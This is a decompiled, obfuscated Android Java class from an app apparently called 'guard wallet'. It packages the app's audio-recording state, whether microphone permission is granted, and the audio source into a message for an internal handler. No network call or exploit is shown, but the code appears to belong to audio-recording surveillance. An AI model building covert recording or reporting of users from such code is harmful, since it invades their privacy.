package j;

import android.support.v4.content.ContextCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceRecordStateVO;
import com.guard.wallet.utils.g;

public final class a implements Runnable {
   public final c a;
   public final String b;
   public final d c;

   public a(d var1, c var2, String var3) {
      this.c = var1;
      this.a = var2;
      this.b = var3;
   }

   @Override
   public final void run() {
      this.c.i.getClass();
      DeviceRecordStateVO var3 = new DeviceRecordStateVO();
      var3.setState(this.a);
      var3.setMessage(this.b);
      d.b().getClass();
      byte var1;
      if (g.Z() != null && ContextCompat.checkSelfPermission(g.Z(), "android.permission.RECORD_AUDIO") == 0) {
         var1 = 1;
      } else {
         var1 = 0;
      }

      var3.setAllowRecord(Integer.valueOf(var1));
      var3.setAudioSource(d.b().j);
      MessageRecordVO var2 = new MessageRecordVO();
      var2.setExtraBody(var3);
      var2.setIntentCode("android.intent.action.RECORD_STATE");
      MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
   }
}
